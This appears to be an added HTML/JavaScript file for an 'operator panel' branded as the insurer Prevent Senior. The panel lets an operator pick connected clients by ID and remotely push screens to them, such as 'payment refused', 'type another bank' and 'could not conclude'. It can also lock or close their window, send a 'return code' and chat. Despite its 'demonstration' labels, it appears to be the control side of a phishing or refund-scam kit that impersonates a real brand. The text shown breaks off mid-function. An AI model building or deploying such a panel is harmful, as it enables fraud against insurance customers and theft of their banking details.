@@ -1,0 +1,2993 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Painel do operador — Prevent Senior</title>
+<link rel="stylesheet" href="style.css">
+
+<script>
+window.DEMO_SERVER_URL =
+  'https://preventseniorgr.onrender.com';
+</script>
+
+<script src="public-sync.js"></script>
+
+<style>
+*{
+  box-sizing:border-box;
+}
+body.operator-body{
+  margin:0;
+  background:#eef3f7;
+  color:#17212b;
+  font-family:Arial,Helvetica,sans-serif;
+}
+.operator-top{
+  min-height:70px;
+  padding:12px 18px;
+  background:#09243d;
+  color:#fff;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  gap:15px;
+}
+.operator-top .logo{
+  font-size:20px;
+  font-weight:800;
+}
+.operator-top .logo span{
+  font-weight:400;
+}
+.operator-top small{
+  opacity:.8;
+}
+.back-mini{
+  border:0;
+  border-radius:8px;
+  padding:9px 13px;
+  background:#fff;
+  color:#09243d;
+  font-weight:700;
+  cursor:pointer;
+}
+.operator{
+  width:min(1200px,calc(100% - 24px));
+  margin:20px auto;
+  display:grid;
+  grid-template-columns:repeat(2,minmax(0,1fr));
+  gap:16px;
+}
+.operator-panel{
+  background:#fff;
+  border:1px solid #d7e0e8;
+  border-radius:14px;
+  padding:16px;
+  box-shadow:0 3px 12px rgba(0,0,0,.05);
+}
+.operator-panel.full{
+  grid-column:1/-1;
+}
+.operator-head{
+  margin-bottom:8px;
+}
+.operator-head h2,
+.operator-panel h2{
+  margin:0 0 8px;
+  font-size:19px;
+}
+.muted{
+  color:#637383;
+  font-size:13px;
+  line-height:1.45;
+}
+.demo-box{
+  padding:12px;
+  border-radius:10px;
+}
+.cmd-grid{
+  display:grid;
+  grid-template-columns:repeat(2,minmax(0,1fr));
+  gap:9px;
+  margin-top:10px;
+}
+.cmd-grid button{
+  min-height:52px;
+  border:1px solid #cbd6df;
+  border-radius:9px;
+  background:#f5f8fa;
+  color:#17212b;
+  font-weight:800;
+  cursor:pointer;
+  padding:9px;
+}
+.cmd-grid button:hover{
+  filter:brightness(.97);
+}
+.cmd-grid button small{
+  display:block;
+  margin-top:4px;
+  font-size:11px;
+  font-weight:500;
+}
+.cmd-grid button:disabled{
+  opacity:.55;
+  cursor:not-allowed;
+}
+textarea,
+input{
+  width:100%;
+  margin-top:8px;
+  padding:11px;
+  border:1px solid #ccd5df;
+  border-radius:9px;
+  background:#fff;
+  color:#17212b;
+  font:inherit;
+}
+textarea{
+  min-height:90px;
+  resize:vertical;
+}
+#connectedClients{
+  display:flex;
+  flex-direction:column;
+  gap:8px;
+  margin-top:12px;
+}
+.client-button{
+  width:100%;
+  text-align:left;
+  padding:12px;
+  border:2px solid #ccd5df;
+  border-radius:10px;
+  background:#fff;
+  color:#222;
+  cursor:pointer;
+}
+.client-button.selected{
+  border-color:#176b3b;
+  background:#eaf8ef;
+}
+.client-button:hover{
+  background:#f4f8fb;
+}
+.client-button.selected:hover{
+  background:#eaf8ef;
+}
+.client-line{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  gap:10px;
+}
+.client-id{
+  display:block;
+  margin-top:5px;
+  color:#666;
+  font-size:11px;
+  word-break:break-all;
+}
+.online{
+  color:#138a43;
+  font-weight:800;
+}
+#chatOperator{
+  height:230px;
+  overflow:auto;
+  background:#f7f9fb;
+  border:1px solid #ddd;
+  border-radius:10px;
+  padding:10px;
+}
+.chat-message{
+  padding:8px 10px;
+  margin:6px 0;
+  border-radius:10px;
+  border:1px solid #e1e6eb;
+}
+.chat-message.client{
+  background:#fff;
+}
+.chat-message.operator{
+  background:#e6f0ff;
+}
+.chat-meta{
+  font-size:11px;
+  color:#667685;
+  margin-bottom:3px;
+}
+.status-good{
+  background:#eaf8ef;
+  border:1px solid #1b8a4b;
+  color:#176b3b;
+}
+.status-bad{
+  background:#fff1f1;
+  border:1px solid #c62828;
+  color:#8f1d1d;
+}
+.status-neutral{
+  background:#f5f8fa;
+  border:1px solid #ccd5df;
+  color:#444;
+}
+.preview-screen{
+  min-height:95px;
+  padding:15px;
+  border-radius:10px;
+  background:#0b1725;
+  color:#fff;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  text-align:center;
+  line-height:1.5;
+}
+.event-list{
+  max-height:300px;
+  overflow:auto;
+}
+.event-item{
+  padding:8px 10px;
+  border-bottom:1px solid #e5e9ed;
+  font-size:13px;
+}
+.event-time{
+  color:#71808e;
+  font-size:11px;
+}
+.copy-area{
+  display:flex;
+  gap:8px;
+  margin-top:8px;
+}
+.copy-area input{
+  margin:0;
+  flex:1;
+}
+.copy-area button{
+  white-space:nowrap;
+}
+@media(max-width:800px){
+  .operator{
+    grid-template-columns:1fr;
+  }
+  .operator-panel.full{
+    grid-column:auto;
+  }
+  .cmd-grid{
+    grid-template-columns:1fr;
+  }
+  .operator-top{
+    align-items:flex-start;
+  }
+}
+</style>
+</head>
+
+<body class="operator-body">
+
+<header class="operator-top">
+  <div>
+    <div class="logo">
+      PREVENT <span>SENIOR</span><b>✓</b>
+    </div>
+    <small>Painel interno — protótipo de demonstração</small>
+  </div>
+
+  Página pública
+</header>
+
+<main class="operator">
+
+<section class="operator-panel">
+  <div class="operator-head">
+    <h2>👥 Clientes conectados</h2>
+  </div>
+
+  <p class="muted">
+    Selecione o cliente que você quer controlar.
+  </p>
+
+  <div id="connectedClients">
+    <div class="demo-box status-neutral">
+      🔴 Nenhum cliente conectado.
+    </div>
+  </div>
+
+  <button type="button" onclick="removerClienteSelecionado()" style="margin-top:10px;padding:9px 12px;border:1px solid #ccd6df;border-radius:9px;background:#fff;color:#7a1f1f;font-weight:800;cursor:pointer;">
+    Remover cliente selecionado
+  </button>
+
+  <div
+    id="selectedClientInfo"
+    class="demo-box status-neutral"
+    style="margin-top:12px;">
+    Nenhum cliente selecionado.
+  </div>
+</section>
+
+<section class="operator-panel">
+
+  <div
+    id="clientReadyNotice"
+    class="demo-box status-bad">
+    <b>🔴 ATENÇÃO:</b><br>
+    Aguardando o cliente confirmar os dados da demonstração.
+  </div>
+
+  <div
+    id="selectedClientStatus"
+    class="demo-box status-neutral"
+    style="margin-top:10px;">
+    Status: nenhum cliente selecionado.
+  </div>
+
+</section>
+
+<section class="operator-panel">
+
+  <h2>🎛️ Comandos para a tela do cliente</h2>
+
+  <p class="muted">
+    Todos os comandos abaixo são estados visuais do protótipo.
+  </p>
+
+  <div class="demo-box status-neutral" style="margin:12px 0;">
+
+    <b>👁️ O cliente verá:</b>
+
+    <div
+      id="clientPreviewText"
+      style="margin-top:8px;">
+      Aguardando comando.
+    </div>
+
+  </div>
+
+  <div
+    id="accessStatus"
+    class="demo-box status-good">
+
+    <b>🟢 SITE LIBERADO</b><br>
+    O cliente pode acessar normalmente.
+
+  </div>
+
+  <div class="cmd-grid">
+
+    <button
+      type="button"
+      onclick="refundLoading()">
+      ⏳ AGUARDE UM MOMENTO
+      <small>OK, carregando… — DEMONSTRAÇÃO</small>
+    </button>
+
+    <button
+      type="button"
+      onclick="refundAnalysis()">
+      🔄 ESTAMOS CONCLUINDO
+      <small>Análise em andamento — DEMONSTRAÇÃO</small>
+    </button>
+
+    <button
+      type="button"
+      onclick="refundDone()">
+      ✅ CONCLUÍDO
+      <small>Concluído com sucesso — DEMONSTRAÇÃO</small>
+    </button>
+
+    <button
+      type="button"
+      onclick="refundRejected()">
+      ⚠️ PAGAMENTO RECUSADO
+      <small>Estado de demonstração</small>
+    </button>
+
+    <button
+      type="button"
+      onclick="refundCancelled()">
+      ❌ PAGAMENTO CANCELADO
+      <small>Estado de demonstração</small>
+    </button>
+
+    <button
+      type="button"
+      onclick="refundOtherBank()">
+      🏦 DIGITE OUTRO BANCO
+      <small>Orientação de demonstração</small>
+    </button>
+
+    <button
+      type="button"
+      onclick="refundWrongAccount()">
+      ⚠️ NÃO FOI POSSÍVEL CONCLUIR
+      <small>Estado de demonstração</small>
+    </button>
+
+    <button
+      id="lockBtn"
+      type="button"
+      onclick="alternarBloqueio()">
+      🔒 BLOQUEAR TELA
+    </button>
+
+    <button
+      type="button"
+      onclick="liberarAcesso()">
+      🟢 LIBERAR ACESSO
+    </button>
+
+    <button
+      type="button"
+      onclick="resetClientScreen()">
+      🔄 RESETAR TELA
+    </button>
+
+    <button
+      type="button"
+      onclick="fecharJanelaCliente()">
+      ✖️ FECHAR JANELA
+    </button>
+
+    <button
+      type="button"
+      onclick="limparMensagem()">
+      🧹 LIMPAR MENSAGEM
+    </button>
+
+  </div>
+
+  <div
+    id="refundStatus"
+    class="demo-box status-neutral"
+    style="margin-top:12px;">
+    Status atual: aguardando comando.
+  </div>
+
+</section>
+
+<section class="operator-panel">
+
+  <div class="operator-head">
+    <h2>🏥 Controle do convênio</h2>
+  </div>
+
+  <p class="muted">
+    Controle do estado visual do convênio na demonstração.
+  </p>
+
+  <div
+    id="convenioStatus"
+    class="demo-box status-good">
+
+    <b>🟢 CONVÊNIO LIBERADO</b><br>
+    O convênio está liberado.
+
+  </div>
+
+  <div class="cmd-grid">
+
+    <button
+      id="convenioBtn"
+      type="button"
+      onclick="alternarConvenio()">
+      BLOQUEAR CONVÊNIO
+    </button>
+
+    <button
+      type="button"
+      onclick="liberarConvenio()">
+      🟢 LIBERAR CONVÊNIO
+    </button>
+
+  </div>
+
+</section>
+
+<section class="operator-panel">
+
+  <div class="operator-head">
+    <h2>🔑 Mensagem / código de devolução</h2>
+  </div>
+
+  <p class="muted">
+    Use somente conteúdo fictício para a demonstração.
+  </p>
+
+  <textarea
+    id="refundMsgCmd"
+    placeholder="Mensagem de demonstração para o cliente..."></textarea>
+
+  <div class="cmd-grid">
+
+    <button
+      type="button"
+      onclick="publicarRefundMsg()">
+      📢 PUBLICAR MENSAGEM
+    </button>
+
+    <button
+      type="button"
+      onclick="limparRefundMsg()">
+      🧹 LIMPAR MENSAGEM
+    </button>
+
+  </div>
+
+  <div style="margin-top:12px;">
+    Código fictício de demonstração
+  </div>
+
+  <input
+    id="demoReturnCode"
+    type="text"
+    placeholder="Digite o código">
+
+  <div class="cmd-grid">
+
+    <button
+      type="button"
+      onclick="publishDemoCode()">
+      📋 ENVIAR CÓDIGO
+    </button>
+
+    <button
+      type="button"
+      onclick="clearDemoCode()">
+      🧹 LIMPAR CÓDIGO
+    </button>
+
+  </div>
+
+  <div
+    id="returnCodePreview"
+    class="demo-box status-neutral"
+    style="margin-top:12px;">
+    Nenhum código enviado.
+  </div>
+
+</section>
+
+<section class="operator-panel full">
+
+  <div class="operator-head">
+    <h2>💬 Atendimento — mensagens</h2>
+  </div>
+
+  <p class="muted">
+    Comunicação do protótipo entre cliente e operador.
+  </p>
+
+  <div id="chatOperator">
+
+    <div class="muted">
+      Selecione um cliente para visualizar a conversa.
+    </div>
+
+  </div>
+
+  <textarea
+    id="chatOpInput"
+    placeholder="Escreva uma mensagem de demonstração para o cliente..."></textarea>
+
+  <div class="cmd-grid">
+
+    <button
+      type="button"
+      onclick="sendOperatorChat()">
+      📤 ENVIAR MENSAGEM
+    </button>
+
+    <button
+      type="button"
+      onclick="sendHelpPrompt()">
+      💬 POSSO AJUDAR?
+    </button>
+
+    <button
+      type="button"
+      onclick="clearOperatorChat()">
+      🧹 LIMPAR CONVERSA
+    </button>
+
+  </div>
+
+</section>
+
+<section class="operator-panel full">
+
+  <div class="operator-head">
+    <h2>📋 Últimas ações recebidas</h2>
+  </div>
+
+  <div
+    id="eventsList"
+    class="event-list">
+
+    <div class="muted">
+      Nenhuma ação registrada.
+    </div>
+
+  </div>
+
+</section>
+
+</main>
+
+<script>
+
+let selectedDemoClient =
+  localStorage.getItem(
+    'preventOperatorSelectedClient'
+  ) || '';
+
+let connectedDemoClients = [];
+let events = [];
+let demoSync = null;
+
+try {
+  demoSync =
+    new BroadcastChannel(
+      'prevent-demo-sync-v21'
+    );
+} catch(error) {
+  demoSync = null;
+}
+
+
+function escapeHtml(value){
+
+  return String(value ?? '')
+    .replace(
+      /[&<>'"]/g,
+      function(char){
+        return {
+          '&':'&amp;',
+          '<':'&lt;',
+          '>':'&gt;',
+          "'":'&#39;',
+          '"':'&quot;'
+        }[char];
+      }
+    );
+
+}
+
+
+function getSelectedClient(){
+
+  return connectedDemoClients.find(
+    function(client){
+      return (
+        client.clientId ===
+        selectedDemoClient
+      );
+    }
+  ) || null;
+
+}
+
+
+function ensureSelectedClient(){
+
+  if(selectedDemoClient){
+    return true;
+  }
+
+  alert(
+    'Selecione um cliente conectado primeiro.'
+  );
+
+  return false;
+
+}
+
+
+function getConfig(){
+
+  try{
+
+    return JSON.parse(
+      localStorage.getItem(
+        'preventOperatorConfig'
+      ) || '{}'
+    );
+
+  }catch(error){
+
+    return {};
+
+  }
+
+}
+
+
+function saveConfig(config){
+
+  localStorage.setItem(
+    'preventOperatorConfig',
+    JSON.stringify(config)
+  );
+
+}
+
+
+function broadcast(payload){
+
+  if(!ensureSelectedClient()){
+    return false;
+  }
+
+  const packet = {
+    ...(payload || {}),
+    clientId:
+      payload?.clientId ||
+      selectedDemoClient,
+    at:
+      payload?.at ||
+      Date.now()
+  };
+
+  try{
+
+    if(
+      demoSync &&
+      typeof demoSync.postMessage ===
+      'function'
+    ){
+
+      demoSync.postMessage(packet);
+
+    }
+
+  }catch(error){}
+
+  try{
+
+    if(
+      window.demoPublic &&
+      typeof window.demoPublic.send ===
+      'function'
+    ){
+
+      window.demoPublic.send(packet);
+
+    }
+
+  }catch(error){}
+
+  try{
+
+    localStorage.setItem(
+      'preventDemoLastEvent',
+      JSON.stringify(packet)
+    );
+
+  }catch(error){}
+
+  return true;
+
+}
+
+
+function broadcastOperatorAction(
+  action,
+  extra
+){
+
+  if(!ensureSelectedClient()){
+    return false;
+  }
+
+  const packet = {
+    type:'operator_action',
+    action:action,
+    clientId:selectedDemoClient,
+    ...(extra || {}),
+    at:Date.now()
+  };
+
+  broadcast(packet);
+
+  addEvent(
+    'Operador: ' + action
+  );
+
+  return true;
+
+}
+
+
+function renderConnectedClients(){
+
+  const box =
+    document.getElementById(
+      'connectedClients'
+    );
+
+  const info =
+    document.getElementById(
+      'selectedClientInfo'
+    );
+
+  if(!box){
+    return;
+  }
+
+  const clients =
+    connectedDemoClients.filter(
+      function(client){
+        return (
+          !client.role ||
+          client.role === 'client'
+        );
+      }
+    );
+
+  if(!clients.length){
+
+    box.innerHTML =
+      '<div class="demo-box status-neutral">' +
+      '🔴 Nenhum cliente conectado.' +
+      '</div>';
+
+    if(info){
+
+      info.className =
+        'demo-box status-neutral';
+
+      info.textContent =
+        'Nenhum cliente selecionado.';
+
+    }
+
+    return;
+
+  }
+
+  box.innerHTML =
+    clients.map(
+      function(client,index){
+
+        const id =
+          client.clientId ||
+          client.id ||
+          '';
+
+        const selected =
+          id ===
+          selectedDemoClient;
+
+        const name =
+          'Cliente ' +
+          String(index + 1);
+
+        return `
+          <button
+            type="button"
+            class="client-button ${selected ? 'selected' : ''}"
+            onclick="selectDemoClient('${escapeHtml(id)}')"
+          >
+            <div class="client-line">
+              <strong>
+                🟢 ${escapeHtml(name)}
+              </strong>
+              ${
+                selected
+                  ? '<span class="online">✓ SELECIONADO</span>'
+                  : ''
+              }
+            </div>
+            <span class="client-id">
+              ID: ${escapeHtml(id)}
+            </span>
+          </button>
+        `;
+
+      }
+    ).join('');
+
+  if(info){
+
+    const selected =
+      clients.find(
+        function(client){
+
+          return (
+            (
+              client.clientId ||
+              client.id
+            ) ===
+            selectedDemoClient
+          );
+
+        }
+      );
+
+    if(selected){
+
+      const name =
+        selected.name ||
+        selected.nome ||
+        'Cliente';
+
+      info.className =
+        'demo-box status-good';
+
+      info.innerHTML =
+        '🟢 <b>Cliente selecionado:</b> ' +
+        escapeHtml(name) +
+        '<br>' +
+        '<small>ID: ' +
+        escapeHtml(
+          selected.clientId ||
+          selected.id ||
+          ''
+        ) +
+        '</small>';
+
+    }else{
+
+      info.className =
+        'demo-box status-neutral';
+
+      info.textContent =
+        'Nenhum cliente selecionado.';
+
+    }
+
+  }
+
+}
+
+
+function selectDemoClient(clientId){
+
+  if(!clientId){
+    return;
+  }
+
+  selectedDemoClient =
+    clientId;
+
+  localStorage.setItem(
+    'preventOperatorSelectedClient',
+    selectedDemoClient
+  );
+
+  renderConnectedClients();
+  renderAll();
+
+  addEvent(
+    'Cliente selecionado: ' +
+    clientId
+  );
+
+}
+
+
+function processClientList(clients){
+
+  connectedDemoClients =
+    Array.isArray(clients)
+      ? clients
+      : [];
+
+  const clientIds =
+    connectedDemoClients
+      .filter(
+        function(client){
+          return (
+            !client.role ||
+            client.role === 'client'
+          );
+        }
+      )
+      .map(
+        function(client){
+          return (
+            client.clientId ||
+            client.id
+          );
+        }
+      )
+      .filter(Boolean);
+
+  if(
+    selectedDemoClient &&
+    !clientIds.includes(
+      selectedDemoClient
+    )
+  ){
+
+    selectedDemoClient = '';
+
+  }
+
+  if(selectedDemoClient){
+
+    localStorage.setItem(
+      'preventOperatorSelectedClient',
+      selectedDemoClient
+    );
+
+  }
+
+  renderAll();
+
+}
+
+
+function confirmedKey(){
+
+  return (
+    'preventDemoClientConfirmed:' +
+    selectedDemoClient
+  );
+
+}
+
+
+function markReady(){
+
+  if(!selectedDemoClient){
+    return;
+  }
+
+  localStorage.setItem(
+    confirmedKey(),
+    '1'
+  );
+
+  updateReadyNotice();
+
+  addEvent(
+    'Cliente confirmou os dados da demonstração.'
+  );
+
+}
+
+
+function resetReady(){
+
+  if(!selectedDemoClient){
+    return;
+  }
+
+  localStorage.removeItem(
+    confirmedKey()
+  );
+
+  updateReadyNotice();
+
+}
+
+
+function updateReadyNotice(){
+
+  const box =
+    document.getElementById(
+      'clientReadyNotice'
+    );
+
+  if(!box){
+    return;
+  }
+
+  if(!selectedDemoClient){
+
+    box.className =
+      'demo-box status-bad';
+
+    box.innerHTML =
+      '<b>🔴 NENHUM CLIENTE SELECIONADO</b><br>' +
+      'Selecione um cliente acima.';
+
+    return;
+
+  }
+
+  const ready =
+    localStorage.getItem(
+      confirmedKey()
+    ) === '1';
+
+  if(ready){
+
+    box.className =
+      'demo-box status-good';
+
+    box.innerHTML =
+      '<b>🟢 CLIENTE CONFIRMOU</b><br>' +
+      'O cliente confirmou os dados da demonstração.';
+
+  }else{
+
+    box.className =
+      'demo-box status-bad';
+
+    box.innerHTML =
+      '<b>🔴 ATENÇÃO</b><br>' +
+      'Aguardando o cliente confirmar os dados da demonstração.';
+
+  }
+
+}
+
+
+function updateClientPreview(text){
+
+  const box =
+    document.getElementById(
+      'clientPreviewText'
+    );
+
+  if(!box){
+    return;
+  }
+
+  box.textContent =
+    text ||
+    'Aguardando comando.';
+
+}
+
+
+function previewForStatus(status){
+
+  const previews = {
+
+    loading:
+      'OK, carregando… — demonstração.',
+
+    analysis:
+      'Estamos concluindo — análise em andamento na demonstração.',
+
+    done:
+      'Concluído com sucesso — demonstração finalizada.',
+
+    rejected:
+      'Pagamento recusado — estado de demonstração.',
+
+    cancelled:
+      'Pagamento cancelado — estado de demonstração.',
+
+    'other-bank':
+      'Digite outro banco — orientação de demonstração.',
+
+    'wrong-account':
+      'Não foi possível concluir — estado de demonstração.'
+
+  };
+
+  return (
+    previews[status] ||
+    'Aguardando comando.'
+  );
+
+}
+
+
+function alternarBloqueio(){
+
+  if(!ensureSelectedClient()){
+    return;
+  }
+
+  const config =
+    getConfig();
+
+  const locked =
+    !Boolean(config.locked);
+
+  saveConfig({
+    ...config,
+    locked:locked
+  });
+
+  broadcast({
+    type:'client_access',
+    clientId:selectedDemoClient,
+    locked:locked,
+    action:
+      locked
+        ? 'block'
+        : 'release'
+  });
+
+  broadcastOperatorAction(
+    locked
+      ? 'block'
+      : 'release',
+    {
+      locked:locked,
+      preview:
+        locked
+          ? 'ACESSO BLOQUEADO'
+          : 'ACESSO LIBERADO'
+    }
+  );
+
+  updateClientPreview(
+    locked
+      ? 'ACESSO BLOQUEADO — demonstração.'
+      : 'ACESSO LIBERADO — demonstração.'
+  );
+
+  renderAccess();
+
+}
+
+
+function liberarAcesso(){
+
+  if(!ensureSelectedClient()){
+    return;
+  }
+
+  const config =
+    getConfig();
+
+  saveConfig({
+    ...config,
+    locked:false
+  });
+
+  broadcast({
+    type:'client_access',
+    clientId:selectedDemoClient,
+    locked:false,
+    action:'release'
+  });
+
+  broadcastOperatorAction(
+    'release',
+    {
+      locked:false,
+      preview:'ACESSO LIBERADO'
+    }
+  );
+
+  updateClientPreview(
+    'ACESSO LIBERADO — demonstração.'
+  );
+
+  renderAccess();
+
+}
+
+
+function renderAccess(){
+
+  const config =
+    getConfig();
+
+  const locked =
+    Boolean(config.locked);
+
+  const button =
+    document.getElementById(
+      'lockBtn'
+    );
+
+  const status =
+    document.getElementById(
+      'accessStatus'
+    );
+
+  if(button){
+
+    button.textContent =
+      locked
+        ? '🔓 LIBERAR TELA'
+        : '🔒 BLOQUEAR TELA';
+
+  }
+
+  if(status){
+
+    if(locked){
+
+      status.className =
+        'demo-box status-bad';
+
+      status.innerHTML =
+        '<b>🔴 SITE BLOQUEADO</b><br>' +
+        'Estado de demonstração.';
+
+    }else{
+
+      status.className =
+        'demo-box status-good';
+
+      status.innerHTML =
+        '<b>🟢 SITE LIBERADO</b><br>' +
+        'Estado de demonstração.';
+
+    }
+
+  }
+
+}
+
+
+function resetClientScreen(){
+
+  if(!ensureSelectedClient()){
+    return;
+  }
+
+  broadcast({
+    type:'client_reset',
+    clientId:selectedDemoClient,
+    reason:'operator_reset'
+  });
+
+  resetReady();
+
+  updateClientPreview(
+    'Tela resetada — aguardando novo início da demonstração.'
+  );
+
+  addEvent(
+    'Operador resetou a tela do cliente.'
+  );
+
+}
+
+
+function fecharJanelaCliente(){
+
+  if(!ensureSelectedClient()){
+    return;
+  }
+
+  broadcast({
+    type:'client_reset',
+    clientId:selectedDemoClient,
+    reason:'close_window'
+  });
+
+  updateClientPreview(
+    'Janela do cliente fechada — demonstração.'
+  );
+
+  addEvent(
+    'Operador fechou/resetou a janela do cliente.'
+  );
+
+}
+
+
+function refundStatusKey(){
+
+  return (
+    'preventDemoRefundStatus:' +
+    selectedDemoClient
+  );
+
+}
+
+
+function setRefundStatus(status){
+
+  if(!ensureSelectedClient()){
+    return;
+  }
+
+  localStorage.setItem(
+    refundStatusKey(),
+    status
+  );
+
+  const preview =
+    previewForStatus(status);
+
+  updateClientPreview(
+    preview
+  );
+
+  broadcast({
+    type:'refund',
+    clientId:selectedDemoClient,
+    status:status,
+    preview:preview
+  });
+
+  broadcastOperatorAction(
+    status,
+    {
+      status:status,
+      preview:preview
+    }
+  );
+
+  renderRefundStatus();
+
+}
+
+
+function refundLoading(){
+  setRefundStatus('loading');
+}
+
+function refundAnalysis(){
+  setRefundStatus('analysis');
+}
+
+function refundDone(){
+  setRefundStatus('done');
+}
+
+function refundRejected(){
+  setRefundStatus('rejected');
+}
+
+function refundCancelled(){
+  setRefundStatus('cancelled');
+}
+
+function refundOtherBank(){
+  setRefundStatus('other-bank');
+}
+
+function refundWrongAccount(){
+  setRefundStatus('wrong-account');
+}
+
+
+function renderRefundStatus(){
+
+  const box =
+    document.getElementById(
+      'refundStatus'
+    );
+
+  if(!box){
+    return;
+  }
+
+  if(!selectedDemoClient){
+
+    box.className =
+      'demo-box status-neutral';
+
+    box.textContent =
+      'Status atual: selecione um cliente.';
+
+    return;
+
+  }
+
+  const status =
+    localStorage.getItem(
+      refundStatusKey()
+    );
+
+  if(!status){
+
+    box.className =
+      'demo-box status-neutral';
+
+    box.textContent =
+      'Status atual: aguardando comando.';
+
+    return;
+
+  }
+
+  const labels = {
+
+    loading:
+      'AGUARDE UM MOMENTO — OK, carregando…',
+
+    analysis:
+      'ESTAMOS CONCLUINDO — análise em andamento',
+
+    done:
+      'CONCLUÍDO — demonstração finalizada',
+
+    rejected:
+      'PAGAMENTO RECUSADO — demonstração',
+
+    cancelled:
+      'PAGAMENTO CANCELADO — demonstração',
+
+    'other-bank':
+      'DIGITE OUTRO BANCO — demonstração',
+
+    'wrong-account':
+      'NÃO FOI POSSÍVEL CONCLUIR — demonstração'
+
+  };
+
+  box.className =
+    'demo-box status-neutral';
+
+  box.innerHTML =
+    'Status atual: <b>' +
+    escapeHtml(
+      labels[status] ||
+      status
+    ) +
+    '</b>';
+
+}
+
+
+function publicarRefundMsg(){
+
+  if(!ensureSelectedClient()){
+    return;
+  }
+
+  const field =
+    document.getElementById(
+      'refundMsgCmd'
+    );
+
+  const message =
+    (field?.value || '').trim();
+
+  if(!message){
+
+    alert(
+      'Digite uma mensagem de demonstração.'
+    );
+
+    return;
+
+  }
+
+  broadcast({
+    type:'operator_message',
+    clientId:selectedDemoClient,
+    message:message,
+    code:'',
+    action:'message'
+  });
+
+  updateClientPreview(
+    'Mensagem enviada: ' +
+    message
+  );
+
+  addEvent(
+    'Mensagem enviada ao cliente.'
+  );
+
+}
+
+
+function limparRefundMsg(){
+
+  if(!ensureSelectedClient()){
+    return;
+  }
+
+  const field =
+    document.getElementById(
+      'refundMsgCmd'
+    );
+
+  if(field){
+    field.value = '';
+  }
+
+  broadcast({
+    type:'operator_message',
+    clientId:selectedDemoClient,
+    message:'',
+    code:'',
+    action:'clear_message'
+  });
+
+  updateClientPreview(
+    'Mensagem limpa.'
+  );
+
+  addEvent(
+    'Mensagem do atendimento limpa.'
+  );
+
+}
+
+
+function limparMensagem(){
+  limparRefundMsg();
+}
+
+
+function publishDemoCode(){
+
+  if(!ensureSelectedClient()){
+    return;
+  }
+
+  const field =
+    document.getElementById(
+      'demoReturnCode'
+    );
+
+  const code =
+    (field?.value || '').trim();
+
+  if(!code){
+
+    alert(
+      'Digite um código fictício de demonstração.'
+    );
+
+    return;
+
+  }
+
+  broadcast({
+    type:'operator_message',
+    clientId:selectedDemoClient,
+    message:
+      'Código de demonstração disponível.',
+    code:code,
+    action:'code'
+  });
+
+  renderReturnCode(
+    code
+  );
+
+  updateClientPreview(
+    'Código de demonstração enviado.'
+  );
+
+  addEvent(
+    'Código fictício enviado ao cliente.'
+  );
+
+}
+
+
+function clearDemoCode(){
+
+  if(!ensureSelectedClient()){
+    return;
+  }
+
+  const field =
+    document.getElementById(
+      'demoReturnCode'
+    );
+
+  if(field){
+    field.value = '';
+  }
+
+  broadcast({
+    type:'operator_message',
+    clientId:selectedDemoClient,
+    message:'',
+    code:'',
+    action:'clear_code'
+  });
+
+  renderReturnCode('');
+
+  updateClientPreview(
+    'Código de demonstração removido.'
+  );
+
+  addEvent(
+    'Código fictício removido.'
+  );
+
+}
+
+
+function renderReturnCode(code){
+
+  const box =
+    document.getElementById(
+      'returnCodePreview'
+    );
+
+  if(!box){
+    return;
+  }
+
+  if(!code){
+
+    box.className =
+      'demo-box status-neutral';
+
+    box.textContent =
+      'Nenhum código enviado.';
+
+    return;
+
+  }
+
+  box.className =
+    'demo-box status-good';
+
+  box.innerHTML =
+    '<b>Código de demonstração atual:</b>' +
+    '<div class="copy-area">' +
+      '<input' +
+        ' id="visibleReturnCode"' +
+        ' readonly' +
+        ' value="' +
+        escapeHtml(code) +
+      '">' +
+      '<button' +
+        ' type="button"' +
+        ' onclick="copyDemoCode()"' +
+        '>' +
+        'COPIAR' +
+      '</button>' +
+    '</div>' +
+    '<small>' +
+    'Código destinado somente ao protótipo.' +
+    '</small>';
+
+}
+
+
+function copyDemoCode(){
+
+  const input =
+    document.getElementById(
+      'visibleReturnCode'
+    );
+
+  if(!input){
+    return;
+  }
+
+  input.select();
+
+  try{
+
+    navigator.clipboard.writeText(
+      input.value
+    );
+
+  }catch(error){
+
+    document.execCommand(
+      'copy'
+    );
+
+  }
+
+  addEvent(
+    'Código de demonstração copiado.'
+  );
+
+}
+
+
+function convenioKey(){
+
+  return (
+    'preventDemoConvenioState'
+  );
+
+}
+
+
+function convenioBloqueado(){
+
+  return (
+    localStorage.getItem(
+      convenioKey()
+    ) === 'blocked'
+  );
+
+}
+
+
+function alternarConvenio(){
+
+  if(!ensureSelectedClient()){
+    return;
+  }
+
+  const blocked =
+    !convenioBloqueado();
+
+  const state =
+    blocked
+      ? 'blocked'
+      : 'available';
+
+  localStorage.setItem(
+    convenioKey(),
+    state
+  );
+
+  broadcast({
+    type:'convenio_state',
+    clientId:selectedDemoClient,
+    state:state
+  });
+
+  broadcastOperatorAction(
+    blocked
+      ? 'bloquear_convenio'
+      : 'liberar_convenio',
+    {
+      state:state
+    }
+  );
+
+  renderConvenio();
+
+}
+
+
+function liberarConvenio(){
+
+  if(!ensureSelectedClient()){
+    return;
+  }
+
+  localStorage.setItem(
+    convenioKey(),
+    'available'
+  );
+
+  broadcast({
+    type:'convenio_state',
+    clientId:selectedDemoClient,
+    state:'available'
+  });
+
+  broadcastOperatorAction(
+    'liberar_convenio',
+    {
+      state:'available'
+    }
+  );
+
+  renderConvenio();
+
+}
+
+
+function renderConvenio(){
+
+  const blocked =
+    convenioBloqueado();
+
+  const button =
+    document.getElementById(
+      'convenioBtn'
+    );
+
+  const status =
+    document.getElementById(
+      'convenioStatus'
+    );
+
+  if(!button || !status){
+    return;
+  }
+
+  if(blocked){
+
+    button.textContent =
+      'LIBERAR CONVÊNIO';
+
+    status.className =
+      'demo-box status-bad';
+
+    status.innerHTML =
+      '<b>🔴 CONVÊNIO BLOQUEADO</b><br>' +
+      'Estado visual da demonstração.';
+
+  }else{
+
+    button.textContent =
+      'BLOQUEAR CONVÊNIO';
+
+    status.className =
+      'demo-box status-good';
+
+    status.innerHTML =
+      '<b>🟢 CONVÊNIO LIBERADO</b><br>' +
+      'Estado visual da demonstração.';
+
+  }
+
+}
+
+
+function chatKey(){
+
+  return (
+    'preventDemoChat:' +
+    selectedDemoClient
+  );
+
+}
+
+
+function getChat(){
+
